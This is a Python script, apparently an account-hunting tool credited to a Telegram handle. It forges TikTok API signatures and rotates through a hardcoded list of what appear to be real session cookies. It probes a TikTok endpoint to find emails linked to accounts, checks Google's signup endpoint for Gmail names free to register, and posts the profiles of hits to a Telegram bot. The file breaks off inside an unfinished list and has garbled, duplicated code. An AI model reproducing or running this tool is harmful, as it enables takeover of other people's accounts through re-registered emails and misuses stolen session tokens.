
from requests import Session
import secrets
import uuid
import time
from MedoSigner import Argus, Gorgon, md5, Ladon
from urllib.parse import urlencode
import requests
import random
from uuid import uuid4
import requests
import os
from user_agent import *
import http.client
import re
from random import randrange,choice,randint
from threading import Thread
from ms4 import InfoTik
from cfonts import render
import binascii
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import requests
import httpx
import random
import uuid
import time
import secrets
from urllib.parse import urlencode
from MedoSigner import Argus, Gorgon, md5, Ladon
import binascii
import os
from concurrent.futures import ThreadPoolExecutor

from requests import Session
import secrets
import uuid
import time
from MedoSigner import Argus, Gorgon, md5, Ladon
from urllib.parse import urlencode
import requests
import random
from uuid import uuid4
import requests
import os
from user_agent import *
import http.client
import re
from random import randrange,choice,randint
from threading import Thread
from ms4 import InfoTik
from cfonts import render
import webbrowser
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
B='\x1b[1;37m'
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m' ;  
print(f'''{C}╔═══════════════════════════════════════════════╗
║                                               ║
║╝           ║
║                                               ║
║           𝙏𝙤𝙤𝙡@𝑩𝒆𝒓𝒌𝒆𝑺𝒂𝒏𝒂𝒍            ║
║         Telegram: @BerkeSanal                      ║
║         Channel : t.me/Berke_py                ║
╚═══════════════════════════════════════════════╝''')      
import requests

G = '\033[1;32m'  # أخضر فاتح
Y = '\033[1;33m'  # أصفر ناعم
C = '\033[1;36m'  # سماوي
E = '\033[0m'     # إنهاء اللون

token = input(f'{G}TOKEN ➤ {E}')
ID = input(f'{Y}ID ➤ {E}')

photo_url = "https://raw.githubusercontent.com/aras52/telegram/main/0dd1ca9548612dcdc72cfadeda36cf26.jpg"
caption = f"""🍸 تم تشغيل الأداة
Ｄｅｖ:  @BerkeSanal
قَـنـاتـي : https://t.me/pytho1n"""

os.system('clear' if os.name =='posix' else 'cls')

requests.post(
    f"https://api.telegram.org/bot{token}/sendPhoto",
    data={
        "chat_id": ID,
        "photo": photo_url,
        "caption": caption
    }
)
badgmail = 0
badtik = 0
goodtik = 0
hits = 0
K = '\033[1;31m'
Y = '\033[1;32m'
S = '\033[1;33m'
M = '\033[1;36m'
X = '\033[1;35m'
W = '\033[1;37m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\033[2;36m'  # سماوي
Y = '\033[1;34m'  # ازرق فاتح
W = "\033[1;37m"  # White
badgmail = 0
badtik = 0
goodtik = 0
hits = 0

def info(userr):	
	tiko = InfoTik.TikTok_Info(userr)
	if 'bad' in tiko['status']:
	 print(' - Bad Username ..!')
	elif 'ok' in tiko['status']:
	 try:
	  Name = tiko['name']
	 except:
	  Name = 'None'
	 try:
	  Followers = tiko['followers']
	 except:
	  Followers = 'None'
	 try:
	  Following = tiko['following']
	 except:
	  Following = 'None'
	 try:
	  Like = tiko['like']
	 except:
	  Like = 'None'
	 try:
	  Video = tiko['video']
	 except:
	  Video = 'None'
	 try:
	  Flag = tiko['flag']
	 except:
	  Flag = 'None'
	 try:
	  Country = tiko['country']
	 except:
	  Country = 'None'
	 try:
	  Date = tiko['Date']
	 except:
	  Date = 'None'
	 try:
	  Id = tiko['id']
	 except:
	  Id = 'None'
	 try:
	  Bio = tiko['bio']
	 except:
	  Bio = 'None'
	 ff = f'''
▬▬▬▬▬▬▬▬▬▬▬▬▬
𝙏𝙮𝙥𝙚      : True
𝙉𝙖𝙢𝙚      : {Name}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚  : {userr}
𝙀𝙢𝙖𝙞𝙡     : {userr}@gmail.com
𝙄𝘿        : {Id}
𝙁𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 : {Following}
𝙁𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {Followers}
𝙇𝙞𝙠𝙚      : {Like}
𝙑𝙞𝙙𝙚𝙤     : {Video}
𝘿𝙖𝙩𝙚      : {Date}
𝙋𝙧𝙞𝙫𝙩𝙚    : false
𝙁𝙡𝙖𝙜      : {Flag}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮   : {Country}
𝘽𝙞𝙤       : {Bio}
𝙇𝙚𝙫𝙚𝙡     : 0
𝙋𝙧𝙤𝙜      : @BerkeSanal / @Berke_Py
▬▬▬▬▬▬▬▬▬▬▬▬▬
	''';print(ff)
	requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
	
def hasseh():	
	os.system('clear' if os.name =='posix' else 'cls')
	print(f'''{C}╔═══════════════════════════════════════════════╗
║                                               ║
║╝           ║
║                                               ║
║           𝙏𝙤𝙤𝙡@𝑩𝒆𝒓𝒌𝒆𝑺𝒂𝒏𝒂𝒍            ║
║         Telegram: @BerkeSanal                      ║
║         Channel : t.me/Berke_py                ║
╚═══════════════════════════════════════════════╝

{G}True : {hits} | {F}False : {badtik}''')

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
    if not unix:
        unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(
            params,
            x_ss_stub,
            unix,
            platform=platform,
            aid=aid,
            license_id=license_id,
            sec_device_id=sec_device_id,
            sdk_version=sdk_version_str,
            sdk_version_int=sdk_version,
        ),
    }
def check2(email):
    global goodtik, badtik
    try:
        secret = secrets.token_hex(16)       
        cookies = {
            "passport_csrf_token": secret,
            "passport_csrf_token_default": secret,            		                "sessionid": random.choice([

'de97ad66ce1497cf4d8b9d110dea93fb',
'e3bb7e67163a29bb0fc06e7e0785eb1d',
'9ef5dd91a967ac5eb3deaa8e78adf7d4',
'df395f8ac47b3db8e9a8f899ac5937d3',
'46a8ef281a146aa734c5527148003fe5',
'5081bf0f8e54a1dd28629a50ae0b0e01',
'3100e89c7b0d70e8a0f41233b28a769c',
'8d7571beb5a4285e6bccfa4cc6a4d502',
'fd61effb1d65a1b01c820361d8228c7c',
'4f761f08a724692c9ecb5e7fc54cbea3',
'b6acb99c05b13b9ff866c26ee64a8fa8',
'270f9222eac7bc490823772ab6e2e5d6',
'72caa1c98fcb6f32f6e850bd4c35db82',
'9784c636cb613f5ffc9a2e088e6b52c9',
'da881e00f5ee6a8e8bdd8e204fba86c1',
'41c1e8b111dfa0775e886ea1b109c034',
'0450dfad42e8db67d641239eabbed617',
'9b6366a935b979859d735d6118b5569a',
'4948cab01813b7f45ce3ed83deb24610',
'5d089b27d551ad19d34851edcca194d1',
'a16fa6c5be204caeef3e2db9abf7e54a',
'4c555f3897daeeaec5d33075aac6e7a5',
'254a8f031e60219494740e5f15be7369',
'13172a5518fda52541c70ff0aafcbd27',
'1c021bf3b9695fd8d213acc84cd3dd6e',
'28b62ed9e06051da8b5dc515199483c1',
'4db1fe68b1e1009045758bcc740f0fbf',
'4c821f77f1861b44e61aa2f54c3b9afb',
'5562df7ed6ab85366497a567880751d2',
'603106ae7bc7bb65e80c4590eea0076d',
'99c7adf6f0e0dc7cb6deb42119e93d5f',
'c9d4f8c3c7dbd57eb8abf0deb0a77328',
'f646d28d34c2b47c38246f15a45e737d',
'f96370f9c70d5e4c57feb0f56535b5bb',
'9f34af4913c67c35dc5b7989b6eebe07',
'603106ae7bc7bb65e80c4590eea0076d',
'c9d4f8c3c7dbd57eb8abf0deb0a77328',
'7bd6c2180a04ced6784609eba91c14cf',
'f96370f9c70d5e4c57feb0f56535b5bb',
'99c7adf6f0e0dc7cb6deb42119e93d5f',
'28b62ed9e06051da8b5dc515199483c1',
'f646d28d34c2b47c38246f15a45e737d',
'5562df7ed6ab85366497a567880751d2',
'1c021bf3b9695fd8d213acc84cd3dd6e',
'4c821f77f1861b44e61aa2f54c3b9afb',
'4db1fe68b1e1009045758bcc740f0fbf',
'1adab5a4fd64e7ac5ce7d67bca586f91',
'270f9222eac7bc490823772ab6e2e5d6',
'9784c636cb613f5ffc9a2e088e6b52c9',
'da881e00f5ee6a8e8bdd8e204fba86c1',
'0450dfad42e8db67d641239eabbed617',
'41c1e8b111dfa0775e886ea1b109c034',
'9b6366a935b979859d735d6118b5569a',
'4948cab01813b7f45ce3ed83deb24610',
'4cbaea00da85706ed949a07ad0ff6319',
'5d089b27d551ad19d34851edcca194d1',
'a16fa6c5be204caeef3e2db9abf7e54a',
'ccf708bcb2f4af8b61d01d41e11dda70',
'4c555f3897daeeaec5d33075aac6e7a5',
'254a8f031e60219494740e5f15be7369',
'13172a5518fda52541c70ff0aafcbd27',
'72caa1c98fcb6f32f6e850bd4c35db82',
'de97ad66ce1497cf4d8b9d110dea93fb',
'e3bb7e67163a29bb0fc06e7e0785eb1d',
'780ec01c3c98a08b5af4bd334193142a',
'9ef5dd91a967ac5eb3deaa8e78adf7d4',
'd08e27df2c75af9276fc4b0f60d72d19',
'df395f8ac47b3db8e9a8f899ac5937d3',
'46a8ef281a146aa734c5527148003fe5',
'7001dc2643f83cf6e72def00fbccfc6f',
'5081bf0f8e54a1dd28629a50ae0b0e01',
'8d7571beb5a4285e6bccfa4cc6a4d502',
'd670e72823c751079017ca9a3b21020c',
'fd61effb1d65a1b01c820361d8228c7c',
'b6acb99c05b13b9ff866c26ee64a8fa8',
'4f761f08a724692c9ecb5e7fc54cbea3',
'4476f5e79a6aeddb2904ac7d8187d205'
'72caa1c98fcb6f32f6e850bd4c35db82'
'de97ad66ce1497cf4d8b9d110dea93fb'
'e3bb7e67163a29bb0fc06e7e0785eb1d'
'9ef5dd91a967ac5eb3deaa8e78adf7d4'
'780ec01c3c98a08b5af4bd334193142a'
'd08e27df2c75af9276fc4b0f60d72d19'
'46a8ef281a146aa734c5527148003fe5'
'7001dc2643f83cf6e72def00fbccfc6f'
'5081bf0f8e54a1dd28629a50ae0b0e01'
'3100e89c7b0d70e8a0f41233b28a769c'
'8d7571beb5a4285e6bccfa4cc6a4d502'
'd670e72823c751079017ca9a3b21020c'
'fd61effb1d65a1b01c820361d8228c7c'
'b6acb99c05b13b9ff866c26ee64a8fa8'
'4f761f08a724692c9ecb5e7fc54cbea3'
'270f9222eac7bc490823772ab6e2e5d6'
'9784c636cb613f5ffc9a2e088e6b52c9'
'da881e00f5ee6a8e8bdd8e204fba86c1'
'0450dfad42e8db67d641239eabbed617'
'41c1e8b111dfa0775e886ea1b109c034'
'9b6366a935b979859d735d6118b5569a'
'4948cab01813b7f45ce3ed83deb24610'
'5d089b27d551ad19d34851edcca194d1'
'ccf708bcb2f4af8b61d01d41e11dda70'
'a16fa6c5be204caeef3e2db9abf7e54a'
'254a8f031e60219494740e5f15be7369'
'4c555f3897daeeaec5d33075aac6e7a5'
'13172a5518fda52541c70ff0aafcbd27'
'1c021bf3b9695fd8d213acc84cd3dd6e'
'1adab5a4fd64e7ac5ce7d67bca586f91'
'28b62ed9e06051da8b5dc515199483c1'
'37ad54561faf757a913333c8a9165d5a'
'4c821f77f1861b44e61aa2f54c3b9afb'
'4db1fe68b1e1009045758bcc740f0fbf'
'5562df7ed6ab85366497a567880751d2'
'603106ae7bc7bb65e80c4590eea0076d'
'7bd6c2180a04ced6784609eba91c14cf'
'99c7adf6f0e0dc7cb6deb42119e93d5f'
'a28e6c3a7d910224f2a8e98765e3ee80'
'c9d4f8c3c7dbd57eb8abf0deb0a77328'
'f646d28d34c2b47c38246f15a45e737d'
'f96370f9c70d5e4c57feb0f56535b5bb'
'f96370f9c70d5e4c57feb0f56535b5bb'
'4476f5e79a6aeddb2904ac7d8187d205'
'9f34af4913c67c35dc5b7989b6eebe07'
'603106ae7bc7bb65e80c4590eea0076d''c9d4f8c3c7dbd57eb8abf0deb0a77328''7bd6c2180a04ced6784609eba91c14cf''7bd6c2180a04ced6784609eba91c14cf''f96370f9c70d5e4c57feb0f56535b5bb''99c7adf6f0e0dc7cb6deb42119e93d5f'
'99c7adf6f0e0dc7cb6deb42119e93d5f''28b62ed9e06051da8b5dc515199483c1'
'f646d28d34c2b47c38246f15a45e737d''5562df7ed6ab85366497a567880751d2''1c021bf3b9695fd8d213acc84cd3dd6e''a28e6c3a7d910224f2a8e98765e3ee80''4c821f77f1861b44e61aa2f54c3b9afb''4db1fe68b1e1009045758bcc740f0fbf''1adab5a4fd64e7ac5ce7d67bca586f91''270f9222eac7bc490823772ab6e2e5d6'
'9784c636cb613f5ffc9a2e088e6b52c9'
'da881e00f5ee6a8e8bdd8e204fba86c1'
'0450dfad42e8db67d641239eabbed617'
'41c1e8b111dfa0775e886ea1b109c034'
'9b6366a935b979859d735d6118b5569a'
'4948cab01813b7f45ce3ed83deb24610'
'4cbaea00da85706ed949a07ad0ff6319''4c555f3897daeeaec5d33075aac6e7a5'
'4cbaea00da85706ed949a07ad0ff6319'
'5d089b27d551ad19d34851edcca194d1'
'ccf708bcb2f4af8b61d01d41e11dda70'
'a16fa6c5be204caeef3e2db9abf7e54a'
'254a8f031e60219494740e5f15be7369'
'13172a5518fda52541c70ff0aafcbd27'
'72caa1c98fcb6f32f6e850bd4c35db82'
'de97ad66ce1497cf4d8b9d110dea93fb'
'e3bb7e67163a29bb0fc06e7e0785eb1d'
'780ec01c3c98a08b5af4bd334193142a'
'9ef5dd91a967ac5eb3deaa8e78adf7d4'
'df395f8ac47b3db8e9a8f899ac5937d3'
'46a8ef281a146aa734c5527148003fe5'
'7001dc2643f83cf6e72def00fbccfc6f'
'5081bf0f8e54a1dd28629a50ae0b0e01'
'3100e89c7b0d70e8a0f41233b28a769c'
'8d7571beb5a4285e6bccfa4cc6a4d502'
'd670e72823c751079017ca9a3b21020c'
'fd61effb1d65a1b01c820361d8228c7c'
'b6acb99c05b13b9ff866c26ee64a8fa8'
'4f761f08a724692c9ecb5e7fc54cbea3'
'9784c636cb613f5ffc9a2e088e6b52c9'
'da881e00f5ee6a8e8bdd8e204fba86c1'
'0450dfad42e8db67d641239eabbed617'
'41c1e8b111dfa0775e886ea1b109c034'
'9b6366a935b979859d735d6118b5569a'
'4948cab01813b7f45ce3ed83deb24610'
'4cbaea00da85706ed949a07ad0ff6319'
'5d089b27d551ad19d34851edcca194d1'
'ccf708bcb2f4af8b61d01d41e11dda70'
'4c555f3897daeeaec5d33075aac6e7a5'
'a16fa6c5be204caeef3e2db9abf7e54a'
'254a8f031e60219494740e5f15be7369'
'13172a5518fda52541c70ff0aafcbd27'
'72caa1c98fcb6f32f6e850bd4c35db82'
'de97ad66ce1497cf4d8b9d110dea93fb'
'e3bb7e67163a29bb0fc06e7e0785eb1d'
'270f9222eac7bc490823772ab6e2e5d6'
            ])
        }
        url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"        
        params_template = {
            "request_tag_from": "h5",
            "fixed_mix_mode": "1",
            "mix_mode": "1",
            "passport-sdk-version": "0",
            "app_language": "en",
            "scene": "4",
            "device_platform": "android",
            "os": "android",
            "ssmix": "a",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "360505",
            "version_name": "36.5.5",
            "manifest_version_code": "2023605050",
            "update_version_code": "2023605050",
            "ab_version": "36.5.5",
            "resolution": "1440*2969",
            "dpi": "532",
            "device_type": "SM-S928B",
            "device_brand": "samsung",
            "language": "EN",
            "os_api": "34",
            "os_version": "14",
            "ac": "wifi",
            "is_pad": "0",
            "current_region": "US",
            "app_type": "normal",
            "sys_region": "US",
            "last_install_time": "1729289943",
            "mcc_mnc": "41820",
            "timezone_name": "Asia/Baghdad",
            "carrier_region_v2": "418",
            "residence": "US",
            "app_language": "en",
            "carrier_region": "US",
            "timezone_offset": "10800",
            "host_abi": "arm64-v8a",
            "locale": "ar",
            "ac2": "wifi",
            "uoo": "0",
            "op_region": "US",
            "build_number": "36.5.5",
            "region": "US",
            "support_webview": "1",
            "cronet_version": "1c651b66_2024-08-30",
            "ttnet_version": "4.2.195.8-tiktok",
            "use_store_region_cookie": "1",
        }
        headers_template = {
            "sdk-version": "1",
            "user-agent": "com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)",
        }
        data_template = {
            "account_sdk_source": "app",
            "multi_login": "1",
            "email_source": "9",
            "mix_mode": "1",
        }       
        params = params_template.copy()
        params.update(
            {
                "_rticket": str(
                    round(random.uniform(1.2, 1.6) * 100000000) * -1
                )
                + "4632",
                "cdid": str(uuid.uuid4()),
                "ts": str(
                    round(random.uniform(1.2, 1.6) * 100000000) * -1
                ),
                "iid": str(random.randint(1, 10**19)),
                "device_id": str(random.randint(1, 10**19)),
                "openudid": str(
                    binascii.hexlify(os.urandom(8)).decode()
                ),
            }
        )       
        m = sign(params=urlencode(params), payload="", cookie="")        
        headers = headers_template.copy()
        headers.update(
            {
                "x-argus": m["x-argus"],
                "x-gorgon": m["x-gorgon"],
                "x-khronos": m["x-khronos"],
                "x-ladon": m["x-ladon"],
            }
        )  
        data = data_template.copy()
        data.update({"email": email})        
        with httpx.Client(timeout=2) as session:
            session.cookies.update(cookies)
            response = session.post(
                url, headers=headers, data=data, params=params
            )               
        if "Email is linked to another account. Unlink or try another email" in response.text:
            goodtik += 1
            hasseh()
            gmm(email)
        else:
            badtik += 1
            hasseh()
    except httpx.RequestError as e:
        print("")
        pass
    except Exception as e:
        pass
yy = 'azertyuiopmlkjhgfdsqwxcvbn'
def 𝘼َِ𝙐ٌِ𝙍ِْ𝘼ٰ():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        𝘼َِ𝙐ٌِ𝙍ِْ𝘼ٰ()
𝘼َِ𝙐ٌِ𝙍ِْ𝘼ٰ()

def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      𝘼َِ𝙐ٌِ𝙍ِْ𝘼ٰ()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': ggb(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      𝘼َِ𝙐ٌِ𝙍ِْ𝘼ٰ()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)
  
def gmm(email):
          global hits,badgmail            
          if 'good' == check_gmail(email):
            
            hits+=1
            hasseh()
            userr = email.split('@')[0]            
            info(userr)
          else:
            badgmail+=1
            hasseh()
print(f'''{C}
╔═══════════════════════════════════════════════╗
║                                               ║
║╝           ║
║                                               ║
║           𝙏𝙤𝙤𝙡@𝑩𝒆𝒓𝒌𝒆𝑺𝒂𝒏𝒂𝒍            ║
║         Telegram: @BerkeSanal                      ║
║         Channel : t.me/Berke_py                ║
╚═══════════════════════════════════════════════╝''')            
F = '\033[91m'  # أحمر
E = '\033[0m'   # إعادة اللون للوضع الطبيعي

print(F + "1- عالي ناصي" + E)
print("")
iko = input(F + 'to choose  : ' + E)
        
def hasseh1():
 while True:
  try:
    keyword = ''.join(random.choice('123456780') for _ in range(10))
    kill = random.choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
'的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
'ğüişöçñäüğüişöçñäüğüişöçñäüqw.ertyuiopasdfghjklzxcvbnm',
'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
           '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
 'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ'
     
               'دجحخهعغفقثصضشسيبلاتنمكطظزوةىلؤءئ',  
            '1234567890azertyuiopmlkjhgfdsqwxcvbn',  
            'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
            'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',  
            'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',  
            'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
            'ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی'
            'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
            'ㅏㅐㅑㅒㅓㅔㅕㅖㅗㅘㅙㅚㅛㅜㅝㅞㅟㅠㅡㅢㅣㄱㄲㄴㄷㄸㄹㅁㅂㅃㅅㅆㅇㅈㅉㅊㅋㅌㅍㅎ'
        ' azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
               'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
               'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç'
            'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç'
               'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç'
                'abcdefghijklmnopqrstuvwxyzñ'
               'abcdefghijklmnopqrstuvwxyzñ'
                'abcdefghijklmnopqrstuvwxyzñ'
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之'
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン'
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン'
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん'
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん'            'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת'
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω'
                'αβγδεζηθικλμνξοπρστυφχψω'
                'abcdefghijklmnopqrstuvwxyzç'
                'abcdefghijklmnopqrstuvwxyzç',
              'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ'
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ'
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ'
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ''Ba ta ji ab ti ko ta ji ra tata titi rara ha ha'

 'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
